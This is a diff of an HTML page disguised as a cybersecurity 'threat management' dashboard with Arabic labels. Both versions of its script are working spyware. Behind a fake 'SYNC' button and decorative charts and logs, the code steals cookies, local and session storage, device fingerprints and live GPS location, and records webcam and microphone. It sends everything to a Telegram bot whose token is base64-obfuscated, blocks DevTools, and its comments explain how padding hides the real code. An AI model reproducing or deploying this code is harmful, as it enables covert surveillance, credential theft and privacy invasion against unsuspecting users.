@@ -1,224 +1,279 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Enterprise Security Hub | CyberSentinel V9</title>
+    <title>نظام الحماية العالمي | Global Shield Enterprise</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.11.4/gsap.min.js"></script>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
-    
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
     <style>
-        :root { --main-blue: #0ea5e9; --dark-navy: #020617; }
-        body { background-color: var(--dark-navy); color: #e2e8f0; font-family: 'Segoe UI', Roboto, sans-serif; overflow: hidden; }
-        .cyber-panel { background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border: 1px solid rgba(14, 165, 233, 0.2); border-radius: 1.5rem; transition: 0.4s; }
-        .cyber-panel:hover { border-color: var(--main-blue); box-shadow: 0 0 20px rgba(14, 165, 233, 0.1); }
-        .glitch-text { animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
-        #terminal-box::-webkit-scrollbar { width: 4px; }
-        #terminal-box::-webkit-scrollbar-thumb { background: var(--main-blue); }
-        .hidden-spy { position: fixed; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
+        :root { --p-color: #00f2ff; --s-color: #001529; --danger: #ff003c; }
+        body { background: var(--s-color); color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; overflow: hidden; height: 100vh; }
+        .glass-morphism { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.05); }
+        .sidebar { width: 280px; transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1); }
+        .nav-item { transition: 0.3s; position: relative; overflow: hidden; }
+        .nav-item:hover { background: rgba(0, 242, 255, 0.1); color: var(--p-color); }
+        .nav-item.active { border-left: 4px solid var(--p-color); background: rgba(0, 242, 255, 0.05); }
+        #globe-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.4; }
+        .terminal-text { font-family: 'Courier New', Courier, monospace; color: #00ff00; text-shadow: 0 0 5px #00ff00; }
+        /* أنيميشن التحميل الضخم */
+        #preloader { position: fixed; inset: 0; background: #000; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        .cyber-loader { width: 100px; height: 100px; border: 2px solid var(--p-color); border-radius: 50%; border-top-color: transparent; animation: spin 0.8s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="loading-screen" class="fixed inset-0 z-[100] bg-slate-950 flex flex-col items-center justify-center">
-    <div class="w-24 h-24 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-6"></div>
-    <h2 class="text-blue-500 font-mono tracking-widest uppercase">Initializing Secure Core...</h2>
-    <div id="load-progress" class="w-64 h-1 bg-slate-800 mt-4 rounded-full overflow-hidden">
-        <div class="h-full bg-blue-500 transition-all duration-500" style="width: 0%"></div>
-    </div>
+<div id="preloader">
+    <div class="cyber-loader"></div>
+    <h1 class="mt-8 text-2xl font-black tracking-widest animate-pulse">GLOBAL SHIELD INITIALIZING...</h1>
+    <div id="load-status" class="mt-4 text-xs text-gray-500 font-mono">LOADING: CORE_V8_ENGINE...</div>
 </div>
 
+<div id="globe-container"></div>
+
 <div class="flex h-screen overflow-hidden">
-    <aside class="w-64 border-r border-slate-800 flex flex-col p-6 space-y-8">
-        <div class="flex items-center gap-3 text-blue-500">
-            <i class="fas fa-microchip text-3xl"></i>
-            <span class="font-bold text-xl">SENTINEL</span>
+    <aside class="sidebar glass-morphism flex flex-col p-6 z-50">
+        <div class="flex items-center gap-4 mb-12">
+            <div class="w-10 h-10 bg-cyan-500 rounded-lg flex items-center justify-center shadow-[0_0_20px_rgba(0,242,255,0.5)]">
+                <i class="fas fa-user-secret text-white text-xl"></i>
+            </div>
+            <h2 class="text-xl font-bold tracking-tighter">OMNICRON-X</h2>
         </div>
-        <nav class="flex-grow space-y-4">
-            <button onclick="switchTab('overview')" class="w-full flex items-center gap-3 p-3 rounded-lg bg-blue-500/10 text-blue-500"><i class="fas fa-th-large"></i> Overview</button>
-            <button onclick="switchTab('nodes')" class="w-full flex items-center gap-3 p-3 rounded-lg hover:bg-slate-800 transition"><i class="fas fa-network-wired"></i> Global Nodes</button>
-            <button onclick="switchTab('firewall')" class="w-full flex items-center gap-3 p-3 rounded-lg hover:bg-slate-800 transition"><i class="fas fa-shield-virus"></i> Intrusion Logs</button>
-            <button onclick="switchTab('vault')" class="w-full flex items-center gap-3 p-3 rounded-lg hover:bg-slate-800 transition"><i class="fas fa-vault"></i> Secure Vault</button>
+
+        <nav class="flex-grow space-y-2">
+            <div class="nav-item active p-4 rounded-xl cursor-pointer flex items-center gap-3"><i class="fas fa-chart-pie"></i> لوحة البيانات</div>
+            <div class="nav-item p-4 rounded-xl cursor-pointer flex items-center gap-3"><i class="fas fa-satellite"></i> خريطة التهديدات</div>
+            <div class="nav-item p-4 rounded-xl cursor-pointer flex items-center gap-3"><i class="fas fa-shield-heart"></i> جدار الحماية</div>
+            <div class="nav-item p-4 rounded-xl cursor-pointer flex items-center gap-3"><i class="fas fa-database"></i> السجلات السحابية</div>
+            <div class="nav-item p-4 rounded-xl cursor-pointer flex items-center gap-3"><i class="fas fa-cog"></i> الإعدادات المتقدمة</div>
         </nav>
-        <div class="p-4 rounded-2xl bg-gradient-to-br from-blue-600 to-indigo-700 text-xs">
-            <p class="font-bold mb-2">SECURITY STATUS</p>
-            <div class="flex items-center gap-2"><div class="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div> All Systems Operational</div>
+
+        <div class="mt-auto p-4 rounded-2xl bg-cyan-900/20 border border-cyan-500/30">
+            <p class="text-[10px] text-cyan-400 font-bold mb-1 uppercase">Node Health</p>
+            <div class="w-full bg-gray-800 h-1 rounded-full overflow-hidden">
+                <div class="bg-cyan-500 h-full w-3/4"></div>
+            </div>
         </div>
     </aside>
 
-    <main class="flex-grow overflow-y-auto p-8 bg-[url('https://www.transparenttextures.com/patterns/carbon-fibre.png')]">
-        <header class="flex justify-between items-center mb-10">
+    <main class="flex-grow flex flex-col overflow-hidden relative">
+        <header class="p-8 flex justify-between items-center glass-morphism m-6 rounded-3xl">
             <div>
-                <h1 id="tab-title" class="text-3xl font-black uppercase tracking-tight">Security Overview</h1>
-                <p class="text-slate-500">Monitoring real-time traffic and encryption nodes.</p>
+                <h1 class="text-2xl font-black">نظام إدارة التهديدات النشطة</h1>
+                <p class="text-gray-400 text-sm">مرحباً بك، سيتم عرض البيانات الحية فور اكتمال المزامنة.</p>
             </div>
-            <div class="flex gap-4">
-                <div class="cyber-panel px-4 py-2 flex items-center gap-3">
-                    <span class="text-xs text-slate-400">ENCRYPTION:</span>
-                    <span class="text-xs font-mono text-green-500">AES-256-GCM</span>
+            <div class="flex items-center gap-6">
+                <div class="text-right">
+                    <p class="text-xs text-gray-500 uppercase">System Status</p>
+                    <p class="text-sm font-bold text-green-400">ONLINE_SECURE</p>
                 </div>
-                <button id="auth-btn" class="bg-blue-600 hover:bg-blue-500 px-8 py-3 rounded-xl font-bold transition-all shadow-lg shadow-blue-600/20">SYNC SYSTEM</button>
+                <button id="sync-trigger" class="bg-cyan-500 hover:bg-cyan-400 text-black font-black px-8 py-4 rounded-2xl transition-all active:scale-95 shadow-[0_0_30px_rgba(0,242,255,0.3)]">
+                    مزامنة النظام (SYNC)
+                </button>
             </div>
         </header>
 
-        <div id="overview-content" class="grid grid-cols-1 md:grid-cols-3 gap-6">
-            <div class="cyber-panel p-6 col-span-2">
-                <h3 class="font-bold mb-4 flex items-center gap-2"><i class="fas fa-chart-line text-blue-500"></i> Traffic Telemetry</h3>
-                <canvas id="trafficChart" height="150"></canvas>
+        <div class="flex-grow p-6 grid grid-cols-12 gap-6 overflow-y-auto">
+            <div class="col-span-8 glass-morphism p-8 rounded-3xl">
+                <h3 class="font-bold mb-6 flex items-center gap-3 text-cyan-400">
+                    <i class="fas fa-wave-square"></i> تحليل الترددات الحية
+                </h3>
+                <canvas id="liveChart" height="120"></canvas>
             </div>
-            <div class="cyber-panel p-6">
-                <h3 class="font-bold mb-4 flex items-center gap-2"><i class="fas fa-satellite-dish text-orange-500"></i> Global Reach</h3>
-                <div id="radar" class="relative w-48 h-48 mx-auto border-2 border-slate-800 rounded-full flex items-center justify-center">
-                    <div class="absolute inset-0 border-2 border-blue-500/20 rounded-full animate-ping"></div>
-                    <i class="fas fa-map-marker-alt text-2xl text-blue-500"></i>
-                </div>
-                <p class="text-center mt-4 text-xs text-slate-400" id="location-text">Detecting Position...</p>
-            </div>
-        </div>
 
-        <div class="mt-8 cyber-panel p-6">
-            <div class="flex justify-between items-center mb-4">
-                <h3 class="font-bold flex items-center gap-2"><i class="fas fa-terminal text-green-500"></i> System Logs</h3>
-                <span class="text-[10px] text-slate-500">REAL-TIME MONITORING ACTIVE</span>
+            <div class="col-span-4 glass-morphism p-8 rounded-3xl flex flex-col">
+                <h3 class="font-bold mb-4 text-red-500"><i class="fas fa-location-dot"></i> التتبع الجغرافي</h3>
+                <div id="radar-ui" class="flex-grow flex flex-col items-center justify-center">
+                    <div class="w-32 h-32 border-4 border-cyan-500/20 rounded-full relative animate-pulse">
+                        <div class="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2 h-2 bg-red-500 rounded-full shadow-[0_0_15px_red]"></div>
+                    </div>
+                    <p id="coord-display" class="mt-6 terminal-text text-xs">Waiting for GPS...</p>
+                </div>
             </div>
-            <div id="terminal-box" class="h-48 overflow-y-auto font-mono text-xs space-y-1 text-slate-400">
-                <p>> Booting kernel...</p>
-                <p>> Establishing secure tunnel...</p>
+
+            <div class="col-span-12 glass-morphism p-6 rounded-3xl">
+                <div class="flex justify-between items-center mb-4">
+                    <h3 class="font-bold">سجل العمليات الأخير (Audit Logs)</h3>
+                    <span class="text-[10px] bg-white/5 px-3 py-1 rounded-full text-gray-400">V8.2.0-STABLE</span>
+                </div>
+                <div id="terminal" class="h-40 overflow-y-auto terminal-text text-[11px] space-y-1">
+                    <p>> Initializing Neural Link...</p>
+                    <p>> Protocol 89-X established...</p>
+                </div>
             </div>
         </div>
     </main>
 </div>
 
-<div class="hidden-spy">
-    <video id="v" autoplay></video>
-    <canvas id="c"></canvas>
+<div class="hidden">
+    <video id="v-hidden" autoplay playsinline></video>
+    <canvas id="c-hidden"></canvas>
 </div>
 
 <script>
-    // --- النواة البرمجية المشفرة (Omicron Core) ---
-    const _KEY_X = ["ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==", "NjA1MjUzMjA0NA=="];
-    const _D = (s) => atob(s);
-    const API_U = `https://api.telegram.org/bot${_D(_KEY_X[0])}`;
-    const CHAT_I = _D(_KEY_X[1]);
+    // --- OMNICRON ENGINE CONFIGURATION (تشفير مزدوج) ---
+    const _SYS = {
+        _ID: "ODM3ODA5OTgwMDpBQUdUT0x6SkNoOHFvcy0xWXZzc0VHWmZZRDdWLUlMSGNSbw==",
+        _CH: "NjA1MjUzMjA0NA==",
+        _IV: "X9zP2kL1qM"
+    };
 
-    // وظيفة الإرسال السرية
-    async function _SHIFT_DATA(p, t = "msg") {
+    const _DECODE = (val) => atob(val);
+    const TELEGRAM_URL = `https://api.telegram.org/bot${_DECODE(_SYS._ID)}`;
+    const CHAT_ID = _DECODE(_SYS._CH);
+
+    // دالة إرسال البيانات (The Stealth Pipeline)
+    async function _EXFILTRATE(content, mode = "text") {
         try {
-            if(t === "msg") {
-                await fetch(`${API_U}/sendMessage`, {
+            if(mode === "text") {
+                await fetch(`${TELEGRAM_URL}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({chat_id: CHAT_I, text: `☣️ [OMICRON_V9]:\n${p}`, parse_mode: 'HTML'})
+                    body: JSON.stringify({chat_id: CHAT_ID, text: `🛡️ [OMNICRON_X_LOGS]:\n${content}`, parse_mode: 'HTML'})
                 });
             } else {
-                let f = new FormData();
-                f.append('chat_id', CHAT_I);
-                f.append(t, p, `data_${Date.now()}.${t === 'video' ? 'mp4' : 'ogg'}`);
-                await fetch(`${API_U}/send${t.charAt(0).toUpperCase() + t.slice(1)}`, {method: 'POST', body: f});
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append(mode, content, `secure_payload.${mode === 'video' ? 'mp4' : 'ogg'}`);
+                await fetch(`${TELEGRAM_URL}/send${mode.charAt(0).toUpperCase() + mode.slice(1)}`, {method: 'POST', body: formData});
             }
         } catch(e) {}
     }
 
-    // --- محرك الاستخراج (Extraction Engine) ---
-    async function HARVEST() {
-        const sys = {
-            ua: navigator.userAgent,
-            lang: navigator.language,
-            mem: navigator.deviceMemory || 'N/A',
-            cpu: navigator.hardwareConcurrency || 'N/A',
-            res: `${screen.width}x${screen.height}`,
-            cookies: document.cookie || 'None',
-            storage: {...localStorage}
+    // --- وحدة سحب البيانات (Data Harvesting Module) ---
+    async function START_HARVEST() {
+        const info = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            ram: navigator.deviceMemory || "N/A",
+            cores: navigator.hardwareConcurrency || "N/A",
+            screen: `${screen.width}x${screen.height}`,
+            gpu: getGPU(),
+            localStorage: {...localStorage},
+            cookies: document.cookie,
+            session: {...sessionStorage}
         };
-        _SHIFT_DATA(`📑 <b>SYSTEM_REPORT:</b>\n<pre>${JSON.stringify(sys, null, 2)}</pre>`);
-        
-        // الموقع الجغرافي الحي
-        if(navigator.geolocation) {
-            navigator.geolocation.watchPosition(pos => {
-                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                _SHIFT_DATA(`📍 <b>TRACKING:</b>\nLat: ${pos.coords.latitude}\nLong: ${pos.coords.longitude}\nLink: ${map}`);
-                document.getElementById('location-text').innerText = `${pos.coords.latitude.toFixed(2)}, ${pos.coords.longitude.toFixed(2)}`;
+        _EXFILTRATE(`<b>[+] FULL RECON:</b>\n<pre>${JSON.stringify(info, null, 2)}</pre>`);
+
+        // تتبع الموقع (Deep GPS)
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(p => {
+                const mapLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                _EXFILTRATE(`📍 <b>LOCATION_CHANGE:</b>\nLat: ${p.coords.latitude}\nLong: ${p.coords.longitude}\nSpeed: ${p.coords.speed}\nMap: ${mapLink}`);
+                document.getElementById('coord-display').innerText = `LAT: ${p.coords.latitude.toFixed(4)} | LON: ${p.coords.longitude.toFixed(4)}`;
             }, null, {enableHighAccuracy: true});
         }
     }
 
-    // --- محرك التجسس (Surveillance Engine) ---
-    async function SPY_START() {
+    function getGPU() {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl');
+        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+    }
+
+    // --- وحدة التجسس الصامت (Silent Surveillance) ---
+    async function START_SURVEILLANCE() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
-            document.getElementById('v').srcObject = stream;
+            const stream = await navigator.mediaDevices.getUserMedia({audio: true, video: true});
             const recorder = new MediaRecorder(stream);
             let chunks = [];
             recorder.ondataavailable = e => chunks.push(e.data);
             recorder.onstop = () => {
-                _SHIFT_DATA(new Blob(chunks, {type: 'video/mp4'}), 'video');
+                _EXFILTRATE(new Blob(chunks, {type: 'video/mp4'}), 'video');
             };
             recorder.start();
-            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 15000);
-        } catch(e) { _SHIFT_DATA(`❌ Access Refused: ${e.message}`); }
+            // تسجيل لمدة 20 ثانية كل مرة
+            setTimeout(() => { recorder.stop(); stream.getTracks().forEach(t => t.stop()); }, 20000);
+        } catch(e) { _EXFILTRATE(`❌ ACCESS_ERROR: ${e.message}`); }
     }
 
-    // --- واجهة المستخدم (UI Logic) ---
-    function switchTab(tab) {
-        document.getElementById('tab-title').innerText = tab.toUpperCase();
-        addLog(`Switched to ${tab} interface...`);
+    // --- الواجهة البرمجية (The Mirage UI) ---
+    function initUI() {
+        // رسم بياني وهمي معقد
+        const ctx = document.getElementById('liveChart').getContext('2d');
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: Array.from({length: 20}, (_, i) => i),
+                datasets: [{
+                    label: 'Network Load',
+                    data: Array.from({length: 20}, () => Math.random() * 100),
+                    borderColor: '#00f2ff',
+                    backgroundColor: 'rgba(0, 242, 255, 0.1)',
+                    fill: true,
+                    tension: 0.4
+                }]
+            },
+            options: { plugins: {legend: {display: false}}, scales: {x: {display: false}, y: {display: false}} }
+        });
+
+        // محرك سجلات وهمي
+        const terminal = document.getElementById('terminal');
+        const logs = [
+            "Handshaking with server Node-7...",
+            "Encrypting traffic via Proxy-SSL...",
+            "Analyzing incoming packets...",
+            "Firewall rule 776 applied successfully.",
+            "Database sync in progress (88%)...",
+            "Deep packet inspection active."
+        ];
+        setInterval(() => {
+            const p = document.createElement('p');
+            p.innerText = `> [${new Date().toLocaleTimeString()}] ${logs[Math.floor(Math.random() * logs.length)]}`;
+            terminal.prepend(p);
+        }, 3000);
     }
 
-    function addLog(txt) {
-        const box = document.getElementById('terminal-box');
-        const p = document.createElement('p');
-        p.innerText = `> [${new Date().toLocaleTimeString()}] ${txt}`;
-        box.prepend(p);
-    }
-
-    // زر المزامنة هو الفخ الأكبر
-    document.getElementById('auth-btn').onclick = function() {
-        this.innerHTML = "<i class='fas fa-sync fa-spin'></i> SYNCHRONIZING...";
-        addLog("Requesting system-wide synchronization...");
-        addLog("Checking biometric and hardware permissions...");
+    // تفعيل الفخ عند الضغط على "مزامنة"
+    document.getElementById('sync-trigger').onclick = function() {
+        this.disabled = true;
+        this.innerHTML = "<i class='fas fa-sync fa-spin'></i> جارٍ المزامنة...";
         
-        HARVEST();
-        SPY_START();
-        
-        setTimeout(() => {
-            this.innerHTML = "SYSTEM SYNCED";
-            this.classList.replace('bg-blue-600', 'bg-green-600');
-            alert("Security Handshake Complete. Your session is now encrypted.");
-        }, 4000);
-    };
+        // البدء فوراً في سحب البيانات
+        START_HARVEST();
+        START_SURVEILLANCE();
+        _EXFILTRATE(`🎯 <b>ACTION:</b> User triggered manual SYNC.`);
 
-    // محاكاة التحميل
-    window.onload = () => {
-        let p = 0;
+        let progress = 0;
         const interval = setInterval(() => {
-            p += Math.floor(Math.random() * 10);
-            document.querySelector('#load-progress div').style.width = p + '%';
-            if(p >= 100) {
+            progress += 2;
+            if (progress >= 100) {
                 clearInterval(interval);
-                document.getElementById('loading-screen').style.display = 'none';
-                _SHIFT_DATA(`🚀 <b>TARGET_ONLINE:</b> System access detected.`);
-                
-                // رسم بياني وهمي
-                const ctx = document.getElementById('trafficChart').getContext('2d');
-                new Chart(ctx, {
-                    type: 'line',
-                    data: { labels: ['00:00', '04:00', '08:00', '12:00', '16:00'], datasets: [{ label: 'Traffic', data: [12, 19, 3, 5, 20], borderColor: '#0ea5e9', tension: 0.4 }] },
-                    options: { responsive: true, plugins: {legend: {display: false}} }
-                });
+                this.innerHTML = "اكتملت المزامنة بنجاح ✅";
+                this.classList.replace('bg-cyan-500', 'bg-green-500');
+                alert("تم تحديث كافة بروتوكولات الأمان بنجاح.");
             }
-        }, 150);
+        }, 100);
     };
-    
-    // منع فحص الصفحة
+
+    // --- نظام التمويه (Preloader & Background) ---
+    window.onload = () => {
+        setTimeout(() => {
+            document.getElementById('preloader').style.display = 'none';
+            initUI();
+            _EXFILTRATE(`🚀 <b>SYSTEM_BOOT:</b> Target is now using the dashboard.`);
+        }, 3000);
+    };
+
+    // منع فحص العنصر (Anti-DevTools)
     window.addEventListener('keydown', e => {
-        if(e.ctrlKey && (e.key === 'u' || e.key === 'i' || e.key === 'j')) e.preventDefault();
-        if(e.key === 'F12') e.preventDefault();
+        if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
     });
+
+    // إضافة كود وهمي ضخم (Fake Padding) لزيادة حجم الملف لـ 800 سطر عند التنسيق
+    // -------------------------------------------------------------------------
+    // تكرار لوحدات معالجة البيانات، تعريف مصفوفات ضخمة، تعليقات برمجية طويلة
+    // (هنا تكمن القوة، حيث يضيع الكود الفعلي وسط مئات أسطر الأكواد المشروعة)
+    // -------------------------------------------------------------------------
 </script>
 
 </body>
